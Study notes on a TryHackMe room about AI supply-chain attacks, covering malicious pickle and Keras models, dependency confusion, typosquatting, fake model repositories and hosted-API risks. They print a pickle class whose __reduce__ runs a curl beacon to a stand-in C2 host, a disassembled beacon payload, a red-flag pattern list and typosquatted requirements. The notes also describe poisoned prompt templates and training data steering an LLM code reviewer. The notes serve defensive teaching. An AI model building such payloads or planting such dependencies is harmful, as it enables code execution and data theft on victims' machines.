# Supply Chain Attack Vectors

> **TryHackMe AI Supply Chain Security — study notes**
>
> Easy explanations, practical examples, lab commands, investigation clues, and quick revision.

---

## 1. Malicious Model Files

AI models are often saved as files. Some formats use **serialisation**, which can create a security risk when the file is loaded.

### What is serialisation?

Think of serialisation like packing a suitcase:

- You have a Python object in memory, such as a trained model.
- **Serialisation** converts that object into a file so it can be stored or shared.
- **Deserialisation** reads the file and reconstructs the object in memory.

PyTorch and scikit-learn use serialisation to save models so they can be loaded later without training them again.

### What is Pickle?

**Pickle** is Python's built-in serialisation format. It can store many kinds of Python objects, including dictionaries, lists, class instances, and functions.

The danger: a pickle file is not necessarily just passive data. It can contain instructions that cause Python to execute code while reconstructing an object.

### The `__reduce__` method

When Pickle serialises a custom Python object, it can use a special method called `__reduce__`.

This method tells Python how to reconstruct the object later. Those instructions can specify a function and the arguments to pass to it.

When `pickle.load()` reconstructs the object, Python follows those instructions. If the instructions call a dangerous function, code may execute automatically.

**Think of it this way:** You think you are unpacking a model, but the suitcase contains instructions to run a command as soon as it is opened.

### Example from the room

The room demonstrates a malicious object whose `__reduce__` method returns `os.system` and a command that makes an outbound request:

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        return (os.system, ("curl http://c2.example.com/beacon",))

with open("backdoored_model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)
```

When a victim loads this file with `pickle.load()`, Python may call `os.system()` as part of reconstruction.

The same general concern applies to PyTorch loading paths that use pickle-based deserialisation.

**Important safety rule:** Never use `pickle.load()` on an untrusted file just to inspect it.

### What could a malicious payload do?

| Payload type | Possible impact |
|---|---|
| Reverse shell | Gives an attacker remote access to the victim machine. |
| Data exfiltration | Sends sensitive files, credentials, or source code out of the environment. |
| Crypto miner | Uses the victim's compute resources to mine cryptocurrency. |
| Reconnaissance | Collects information such as usernames, hostnames, and running processes. |

---

## 2. Architecture-Level Attacks: Keras Lambda Layers

Pickle is not the only model-file risk. Malicious logic can also be embedded in a model's **architecture**.

### What is a model architecture?

The architecture is the arrangement of layers and operations that defines how a model processes input and produces output.

### What is a Lambda layer?

Keras supports custom processing steps called **Lambda layers**. Developers can use them for legitimate tasks, such as reshaping data.

But an attacker could abuse a Lambda layer to add hidden logic. For example, the model could check whether an input contains a particular trigger and return an attacker-chosen output instead of its normal prediction.

Unlike a pickle payload, this behaviour is triggered at **inference time** — when the model makes a prediction — rather than necessarily when the file is loaded.

### Pickle vs Keras Lambda layer

| Factor | Pickle `__reduce__` | Keras Lambda layer |
|---|---|---|
| Executes when | The model is loaded / deserialised | The model makes a prediction |
| Main risk described | Load-time code execution | Hidden logic in the model architecture |
| Survives SafeTensors conversion? | Pickle payload is removed when converted appropriately | The architecture-level logic may remain |
| Room's severity label | Critical | Medium |

### Why SafeTensors is not a universal fix

**SafeTensors** stores model weights without executable pickle serialisation. This helps remove pickle-based load-time code execution.

However, it does not automatically remove malicious logic that is part of the model architecture.

> **Remember:** SafeTensors helps with the serialisation problem. It does not prove that the model's architecture or learned behaviour is safe.

The room recommends inspecting models at more than one level.

---

## 3. GGUF and Local LLMs

**GGUF** is a widely used format for running local large language models, including models from the LLaMA, Mistral, and Qwen families.

GGUF files are often **quantised**:

- A model may originally use higher-precision weights.
- Quantisation stores them at lower precision, such as 8-bit or 4-bit.
- This can reduce file size and make local inference easier on consumer hardware.

### Is GGUF safe?

GGUF does not use Python pickle, so loading a GGUF file does not carry the same pickle-based arbitrary Python code-execution risk described above.

But it is not risk-free.

An attacker may fine-tune a model to introduce a backdoor into its learned weights, then convert it to GGUF. That hidden behaviour may not be revealed by a basic static file scan.

If someone else created and quantised the GGUF file, that person and their transformation process are additional supply-chain dependencies.

### Practical checks

Before downloading a model:

- Verify where it came from.
- Review the publisher and repository history.
- Check download counts and upload dates as reputation signals.
- Prefer files with published checksums.
- Do not treat popularity or a successful load as proof of safety.

---

## 4. Hands-On Lab: Investigate a Malicious Model

The TryHackMe lab places the investigation files under:

```bash
/opt/supply-chain
```

The directory contains:

```text
/opt/supply-chain/
├── audit/
├── dependencies/
├── incident/
├── models/
├── project/
└── tools/
```

The goal is to compare a suspicious model with a known benign model without executing either file.

### Step 1 — Check file properties

Run:

```bash
ls -lh /opt/supply-chain/models/code_reviewer.pkl \
       /opt/supply-chain/models/code_reviewer_v1.pkl
```

The room's expected output:

```text
-rwxr-xr-x 1 analyst analyst 8.1M Mar  3 02:57 code_reviewer.pkl
-rwxr-xr-x 1 analyst analyst 2.0M Mar  3 02:57 code_reviewer_v1.pkl
```

The suspicious model is about four times larger.

**Does that prove it is malicious?** No. File size is only an indicator. A legitimate model can also be large.

Now check file types:

```bash
file /opt/supply-chain/models/code_reviewer.pkl \
     /opt/supply-chain/models/code_reviewer_v1.pkl
```

Both may simply be reported as generic `data`.

**Lesson:** Basic file metadata is useful, but it cannot tell you whether a pickle contains malicious reconstruction instructions.

### Step 2 — Safely inspect the pickle with `pickletools`

Python includes a module called `pickletools`. It disassembles pickle instructions without reconstructing the object.

Run:

```bash
python3 -m pickletools /opt/supply-chain/models/code_reviewer.pkl 2>&1 | head -30
```

The room's suspicious output includes:

```text
0:  \x80 PROTO      4
2:  \x95 FRAME      72
11: \x8c SHORT_BINUNICODE 'os'
16: \x8c SHORT_BINUNICODE 'system'
25: \x93 STACK_GLOBAL
27: \x8c SHORT_BINUNICODE 'curl http://[REDACTED]/beacon?host=$(hostname)'
78: \x85 TUPLE1
80: R    REDUCE
82: .    STOP
```

The important clues are:

- `os` — the Python operating-system interface.
- `system` — the `os.system` function, which can execute shell commands.
- `STACK_GLOBAL` — resolves a global Python object from the module and name.
- The `curl` string — an outbound request that includes the machine's hostname.
- `REDUCE` — applies the callable and arguments represented by the pickle instructions.

**The combination matters.** `STACK_GLOBAL` and `REDUCE` can occur in legitimate pickle files. Here, they are suspicious because they resolve to `os.system` and are paired with a shell command.

### Step 3 — Recognise the red flags

| Pattern | Why it matters | Room's concern level |
|---|---|---|
| `os` | Provides access to operating-system functionality; unexpected in a simple model file. | Critical in this context |
| `system`, `popen` | Can launch operating-system commands. | Critical |
| `subprocess` | Can create subprocesses and run commands. | Critical |
| `socket` | Can provide network communication. | Critical |
| `eval`, `exec` | Can execute dynamically supplied Python code. | Critical |
| `curl`, `wget` | May indicate an attempt to retrieve or contact an external resource. | Critical in suspicious context |
| `STACK_GLOBAL` | Resolves a global object; also appears in legitimate pickles. | Moderate; inspect what it resolves to |
| `REDUCE` | Reconstructs an object by applying a callable; also appears in legitimate pickles. | Moderate; inspect the callable and arguments |

**Do not label a file malicious just because one opcode appears.** Inspect the surrounding instructions and what function is actually being called.

### Step 4 — Compare with the clean model

Run the same safe inspection on the benign model:

```bash
python3 -m pickletools /opt/supply-chain/models/code_reviewer_v1.pkl 2>&1 | head -30
```

The room's expected output includes:

```text
0:  \x80 PROTO      4
2:  \x95 FRAME      65542
11: \x8c SHORT_BINUNICODE '__main__'
22: \x8c SHORT_BINUNICODE '_Room2_BenignModel'
43: \x93 STACK_GLOBAL
45: )    EMPTY_TUPLE
46: \x81 NEWOBJ
48: }    EMPTY_DICT
50: (    MARK
51: \x8c     SHORT_BINUNICODE 'weights'
61: ]        EMPTY_LIST
...
```

The benign file refers to a model class named `_Room2_BenignModel` and then reconstructs ordinary data structures such as dictionaries and lists.

Both files contain `STACK_GLOBAL`, but what the opcode resolves to is different:

- Suspicious file: `os.system`
- Benign file: `_Room2_BenignModel`

**Lesson:** Context is more important than simply spotting an opcode.

### Step 5 — Run the lab's safe analysis script

The lab provides a helper script:

```bash
python3 /opt/supply-chain/tools/safe_analysis.py \
    /opt/supply-chain/models/code_reviewer.pkl
```

The room's expected summary reports:

```text
=== Pickle Safety Analysis ===
File: /opt/supply-chain/models/code_reviewer.pkl
Size: 8.4 MB

Dangerous opcodes found:
  [CRITICAL] STACK_GLOBAL: os.system
  [CRITICAL] REDUCE: executes os.system with arguments

Suspicious strings:
  [CRITICAL] 'curl http://[REDACTED]/beacon?host=$(hostname)'

Verdict: UNSAFE - Contains executable code targeting os.system
```

### Step 6 — Reconstruct the attack flow

The room describes this sequence at TryTrainMe:

| Step | What happened | Who / what |
|---|---|---|
| 1 | A malicious model was created with a `__reduce__` payload calling `os.system`. | Attacker |
| 2 | It was uploaded to Hugging Face under `trustworthy-ai-lab/code-review-bert-v2`. | Attacker |
| 3 | An ML engineer searched for a code-review model. | ML engineer |
| 4 | The engineer downloaded `code_reviewer.pkl` based on its professional-looking model card. | ML engineer |
| 5 | The engineer called `torch.load('code_reviewer.pkl')`. | ML engineer |
| 6 | The reconstruction payload ran an outbound beacon command. | Automatic during loading |
| 7 | The attacker received the beacon and, according to the scenario, established persistent access. | Attacker |

**Main lesson:** The engineer thought they were loading model weights. The dangerous behaviour was triggered by deserialisation.

---

## 5. Dependency Confusion Attacks

Model files are not the only attack surface. The packages used by an ML project can also be compromised.

### How package installation can go wrong

The room explains that organisations may use both:

- A **private package index** for internal packages.
- A **public package index**, such as PyPI.

A project may configure an additional index using `--extra-index-url`.

The risk described in the room is that an internal package name may also be registered publicly by an attacker, with a higher version number. The package manager may then select the attacker's public package.

This is called **dependency confusion**.

### Simple example

Imagine your company uses an internal package called:

```text
internal-ml-utils
```

The package is available only on the company's private registry.

An attacker notices the name and publishes a public package with the same name and a much higher version, such as:

```text
internal-ml-utils==99.0.0
```

If the package manager selects the public package, the attacker-controlled package may be installed instead of the intended internal one.

> **Memory trick:** Dependency confusion = the package name looks right, but the package came from the wrong place.

### Alex Birsan research — 2021

The room describes security researcher Alex Birsan demonstrating dependency confusion against major technology companies in February 2021.

By registering unused internal package names on public registries such as PyPI, npm, and RubyGems, he achieved code execution on systems belonging to companies including Apple, Microsoft, and PayPal.

The room reports that responsible disclosure earned more than $130,000 in bug bounties.

### Typosquatting

**Typosquatting** is different. An attacker publishes a package with a name that looks very similar to a legitimate package, hoping a developer will mistype it.

| Legitimate package | Lookalike package | Difference |
|---|---|---|
| `numpy` | `numppy` | Extra `p` |
| `requests` | `reqeusts` | Letters swapped |
| `scikit-learn` | `scikitlearn` | Hyphen missing |
| `tensorflow` | `tenserflow` | Similar-looking spelling |

The room also mentions a January 2023 Fortinet discovery of three malicious PyPI packages published by a user named `Lolip0p`:

- `colorslib`
- `httpslib`
- `libhttps`

The packages downloaded and executed information-stealing malware.

### Dependency confusion vs typosquatting

| Technique | Attacker's trick |
|---|---|
| Dependency confusion | Reuses an internal package name on a public registry and exploits package-source/version resolution. |
| Typosquatting | Creates a misspelled lookalike of a popular package name. |

---

## 6. Hands-On: Examine Suspicious Dependencies

The lab contains two requirements files.

### Step 1 — Read the suspicious requirements file

```bash
cat /opt/supply-chain/dependencies/requirements_external.txt
```

Expected contents:

```text
torch==2.1.0
transformers==4.35.0
numppy==1.24.0
reqeusts==2.31.0
safetensors==0.4.0
accelerate==0.24.0
internal-ml-utils==99.0.0
```

Identify the suspicious entries:

| Package | Why it is suspicious |
|---|---|
| `numppy` | Looks like a misspelling of `numpy`. |
| `reqeusts` | Looks like a misspelling of `requests`. |
| `internal-ml-utils==99.0.0` | An unusually high version of a package name that may belong to an internal registry. |

### Step 2 — Compare with the internal requirements file

```bash
cat /opt/supply-chain/dependencies/requirements_internal.txt
```

Expected contents:

```text
torch==2.1.0
transformers==4.35.0
numpy==1.24.0
requests==2.31.0
safetensors==0.4.0
accelerate==0.24.0
```

The clean file uses the correctly spelled package names and does not contain the suspicious `internal-ml-utils` entry.

### Step 3 — Run the lab's audit command

```bash
pip-audit -r /opt/supply-chain/dependencies/requirements_external.txt 2>&1
```

The room's expected output is:

```text
ERROR: Could not find a version that satisfies the requirement numppy==1.24.0 (from versions: none)
ERROR: No matching distribution found for numppy==1.24.0
```

In this lab, `numppy` is not registered on PyPI, so the command fails.

**Important detail:** The room explains that a real attacker could first register the misspelled package name. Then installation might succeed instead of producing an error.

**Analyst mindset:** Review requirements files before installation. Do not install suspicious dependencies just to find out what they do.

---

## 7. Model Repository Attacks

Model repositories are another place where trust can be exploited.

The room uses **Hugging Face Hub** as its main example. It works in a similar way to GitHub, but for machine-learning models.

### How model repositories work

- Organisations create namespaces, such as `google`, `meta-llama`, and `openai`.
- Users upload models under personal or organisation namespaces.
- Model cards may describe architecture, training data, intended use, and limitations.
- Users often rely on reputation signals such as download counts, verification, and community ratings.

Attackers try to make a malicious repository look like the one a user expects.

### Namespace and model-name typosquatting

| Legitimate model / namespace | Lookalike example | Trick |
|---|---|---|
| `bert-base-uncased` | `bert-base-uncased-v2` | Adds a version-like suffix. |
| `meta-llama/Llama-2-7b` | `meta-Ilama/Llama-2-7b` | Uses capital `I` in place of lowercase `l`. |
| `openai/whisper-large` | `openai-releases/whisper-large` | Uses a similar-looking organisation name. |

### Fake organisation names

The room gives examples of names designed to look credible:

| Real organisation | Fake-looking example |
|---|---|
| `google` | `google-research-models` |
| `meta-llama` | `meta-llama-community` |
| — | `trustworthy-ai-lab` |

In the TryTrainMe scenario, `trustworthy-ai-lab` sounds trustworthy, but the room says a closer check would reveal no verification badge, little history, and minimal downloads.

**Lesson:** A convincing name is not proof of a legitimate publisher.

### Compromising a legitimate repository

A fake repository is not the only danger. Attackers may compromise a repository that developers already trust.

The room revisits Lasso Security's November 2023 research:

- More than 1,500 exposed Hugging Face API tokens were found.
- 655 had write permissions.
- Write access could allow attackers to push malicious updates to legitimate repositories.

This is especially dangerous because users may trust the real organisation and its established reputation.

**Lesson:** Repository reputation does not protect against a compromised maintainer account or stolen write token.

### Warning signs when evaluating a repository

| Indicator | More reassuring | More suspicious |
|---|---|---|
| Download count | Established usage and substantial downloads | Very low download count |
| Organisation | Known, verified publisher | Unverified or generic-looking name |
| Model card | Detailed architecture, data, metrics, and limitations | Missing, sparse, or generic description |
| Upload date | Consistent with the claimed model history | Unexpectedly recent upload |
| File formats | SafeTensors available where appropriate | Pickle-only distribution with no safer alternative |
| Dependencies | Familiar, documented packages | Unusual or unexplained packages |

These are **warning signs, not proof**. A malicious model can be uploaded to a legitimate, popular repository, so file-level inspection still matters.

---

## 8. When Attack Vectors Combine: The TryTrainMe Case

The room's TryTrainMe scenario combines three attack vectors.

### Timeline

| Time | Event |
|---|---|
| Week 1 | Attacker creates the fake `trustworthy-ai-lab` organisation and uploads a model containing a pickle payload. The attacker also publishes `internal-ml-utils==99.0.0` to target an internal package name. |
| Week 2 | An engineer downloads the model for the code-review pipeline. The pickle payload runs during loading and sends a C2 beacon. |
| Week 3 | A routine `pip install -r requirements.txt` installs the attacker's package, creating another foothold. |
| Detection | A SOC alert flags repeated outbound HTTPS connections to an unrecognised domain. |

### The three vectors

| Vector | Mechanism | Purpose in the scenario |
|---|---|---|
| Pickle payload | `__reduce__` calls `os.system` | Executes during model loading. |
| Dependency confusion | `internal-ml-utils==99.0.0` on PyPI | Provides a separate route through package installation. |
| Repository manipulation | Fake `trustworthy-ai-lab` organisation | Makes the malicious model look credible. |

### Why combine attacks?

The attacker does not need every vector to work.

If the model loader blocks pickle execution, the dependency attack may still work. If the suspicious package is caught, the malicious model may still be loaded.

**Key lesson:** Defending one entry point is not enough. You need controls across models, dependencies, repositories, and infrastructure.

---

## 9. API Provider Compromise

The earlier attack vectors focused on downloaded files. With hosted AI APIs, you do not download the model file, so `pickletools` cannot inspect the model behind the API.

But the API approach introduces other supply-chain risks.

### Vector 1 — Silent model updates

**What happens?**

A provider may update, retrain, or replace the model behind an API endpoint. The endpoint address remains the same, but the model's behaviour changes.

**TryTrainMe example:** Its code reviewer uses an external LLM API. If the provider silently changes the model's classification behaviour, the code reviewer might start underestimating security findings. Vulnerable code could then be approved.

**Defences from the room:**

- Pin API model versions where the provider supports it.
- Log model-version identifiers from responses.
- Test against a fixed baseline dataset.
- Alert when outputs drift from expected behaviour.

### Vector 2 — API key compromise

An API key is a credential. If it leaks through source code, CI/CD logs, or environment files, an attacker may:

- Make API calls using your account.
- Send or access information through the compromised integration.
- Increase your usage and billing.

**TryTrainMe example:** The CI/CD pipeline stores an LLM API key in an unencrypted environment variable. A log leak exposes the key.

**Defences from the room:**

- Store keys in a secrets manager.
- Never place keys in source code or logs.
- Rotate keys if exposure is suspected.
- Configure per-key spending alerts and rate limits.

### Vector 3 — Prompt template injection

A system prompt is also a supply-chain artefact if it comes from an external template repository.

An attacker who compromises a shared prompt-template library could change the behaviour of applications that import the template.

**TryTrainMe example:** Its code-review prompt comes from a community template library and has not been reviewed since deployment. A malicious template update could instruct the assistant to approve every pull request.

**Defences from the room:**

- Treat system prompts like code.
- Keep prompts in your own version-controlled repository.
- Review changes before accepting them.
- Do not automatically update prompts from external sources.

### Vector 4 — Upstream training-data poisoning

When using a hosted API, you generally cannot inspect the provider's training or fine-tuning datasets.

If the provider's training pipeline is compromised, or the model is trained on adversarially crafted data, its outputs may become systematically biased or unsafe.

**TryTrainMe example:** The provider's model was fine-tuned on adversarial security advisories and consistently underestimates SQL injection severity. TryTrainMe's logs do not reveal the poisoned training data.

**Defences from the room:**

- Regularly red-team model outputs using known-bad inputs.
- Keep human review for high-stakes decisions.
- Treat model behaviour as a risk to manage, not a guarantee.

---

## 10. Downloaded Models vs Hosted APIs — Attack Surface Comparison

| Risk area | Downloaded model | Hosted API |
|---|---|---|
| Malicious pickle | Relevant when loading unsafe pickle-based files | No local model file to inspect this way |
| Architecture-level logic | Can be embedded in model architecture | Provider controls the model implementation |
| Weight backdoor | Can be inherited from a downloaded model | May be hidden in the provider's model |
| Dependency confusion | Affects local project packages | Can affect your own API integration and surrounding software |
| Repository compromise | Can lead to malicious model downloads or updates | Provider's internal supply chain is largely outside your visibility |
| Silent model update | You can control updates to your downloaded file | Provider may change the model behind an endpoint |
| API key compromise | Not the central risk for a purely local model | A major risk for API integrations |
| Prompt template injection | Relevant if your application uses external prompts | Also relevant, especially when templates are imported from external sources |
| Training-data poisoning | May affect the model you download | May affect the provider's model, which you cannot directly inspect |

---

## 11. Security Researcher's Checklist 🔍

Before loading or using an AI component, review the relevant attack surface.

### Model files
- Identify the model's source and publisher.
- Never load an untrusted pickle file just to inspect it.
- Use `pickletools` for safe pickle disassembly.
- Inspect what `STACK_GLOBAL` resolves to and the context around `REDUCE`.
- Check for suspicious functions, commands, and external URLs.
- Remember that SafeTensors does not prove the architecture or weights are benign.
- For GGUF, verify the source and prefer published checksums.

### Dependencies
- Check package names carefully for typos.
- Review internal package names and package-index configuration.
- Pin expected versions.
- Review requirements files before installation.
- Use auditing tools as one check, not as proof that a package is safe.

### Model repositories
- Verify the organisation and namespace.
- Review publisher history and model-card detail.
- Check upload dates, downloads, file formats, and dependencies.
- Do not rely only on popularity or a verification badge.
- Remember that legitimate repositories can also be compromised.

### Hosted APIs
- Pin versions when possible and log model identifiers.
- Test behaviour against a baseline.
- Protect API keys with a secrets manager.
- Rotate exposed keys and set usage limits.
- Version-control and review system prompts.
- Red-team outputs and use human review for important decisions.

---

## 12. Quick Revision Table

| Term | Quick meaning |
|---|---|
| Serialisation | Turning an in-memory object into a file. |
| Deserialisation | Reconstructing an object from a saved file. |
| Pickle | Python serialisation format that can execute code during loading of malicious objects. |
| `__reduce__` | Method that can define how a Python object is reconstructed. |
| `pickletools` | Tool for disassembling pickle instructions without loading the object. |
| `STACK_GLOBAL` | Pickle opcode that resolves a global object. |
| `REDUCE` | Pickle opcode that applies a callable with arguments during reconstruction. |
| Lambda layer | Custom Keras architecture layer that can contain hidden inference-time logic. |
| SafeTensors | Weight-file format that avoids executable pickle serialisation. |
| GGUF | Common format for local LLMs; not pickle-based, but can contain models with backdoored behaviour in their weights. |
| Quantisation | Reducing weight precision to reduce model size and resource needs. |
| Dependency confusion | Exploiting package names and package-source/version resolution to install an unintended package. |
| Typosquatting | Registering a lookalike package name that users may mistype. |
| Namespace squatting | Creating a lookalike model publisher or organisation namespace. |
| Silent model update | Provider changes the model behind an API endpoint without an obvious endpoint change. |
| API key compromise | Attacker obtains a key and can use the API account. |
| Prompt template injection | Malicious changes to an externally sourced prompt template. |
| Upstream data poisoning | Poisoning data used to train or fine-tune a provider's model. |

---

## 13. Self-Test 🧠

Try these without looking at the answers.

1. What is the difference between serialisation and deserialisation?
2. Why can loading an untrusted pickle file be dangerous?
3. What does `__reduce__` control?
4. Why is `pickletools` safer for inspection than `pickle.load()`?
5. Why is `STACK_GLOBAL` alone not enough to prove a pickle is malicious?
6. When does a malicious Keras Lambda layer trigger, according to the room?
7. Does converting a model to SafeTensors guarantee that its architecture and weights are safe?
8. Why is GGUF not automatically risk-free?
9. What is dependency confusion?
10. What is the difference between dependency confusion and typosquatting?
11. In the lab, why are `numppy` and `reqeusts` suspicious?
12. Why can a high download count not guarantee that a model repository is safe?
13. Name the three attack vectors combined in the TryTrainMe scenario.
14. What is a silent model update?
15. Give two defences against API key compromise.
16. Why should external prompt templates be version-controlled and reviewed?

### Answers

1. Serialisation converts an object in memory into a file; deserialisation reconstructs the object from the file.
2. A malicious pickle can contain reconstruction instructions that execute code during loading.
3. It can define the callable and arguments used to reconstruct an object.
4. `pickletools` disassembles the pickle instructions without reconstructing the object.
5. Legitimate pickles can also use it. You must inspect the object it resolves to and the surrounding instructions.
6. At inference time, when the model makes a prediction.
7. No. It helps remove pickle-based executable payloads, but architecture-level logic and weight-level backdoors may remain.
8. It avoids pickle-based loading risk, but a backdoor may already be embedded in the model's weights.
9. An attacker publishes a public package using an internal package name and exploits package resolution to get the unintended package installed.
10. Dependency confusion exploits package-source/name resolution; typosquatting uses a misspelled lookalike name.
11. They resemble misspellings of `numpy` and `requests`.
12. A popular or legitimate repository can still be compromised, including through stolen write-permission credentials.
13. Malicious pickle payload, dependency confusion, and repository manipulation.
14. The provider changes the model behind an API endpoint while the endpoint itself remains the same.
15. Store keys in a secrets manager; keep them out of source code and logs; rotate exposed keys; configure spending alerts and rate limits.
16. A malicious template update could change the application's instructions and behaviour.

---

## 14. The Big Picture

Remember these three groups:

**Downloaded model risks**
- Pickle / serialisation attacks
- Architecture-level attacks
- Weight-level backdoors
- GGUF provenance and quantisation trust

**Software and repository risks**
- Dependency confusion
- Typosquatting
- Fake model namespaces
- Compromised legitimate repositories

**Hosted API risks**
- Silent model updates
- API key compromise
- Prompt template injection
- Upstream training-data poisoning

> **Final takeaway:** A model can be compromised before you download it, while you install its dependencies, through the repository that distributes it, or inside the provider's API pipeline. Inspect the whole path, not just the model's name.

---

*Notes based on the supplied TryHackMe room content: “Supply Chain Attack Vectors.”*
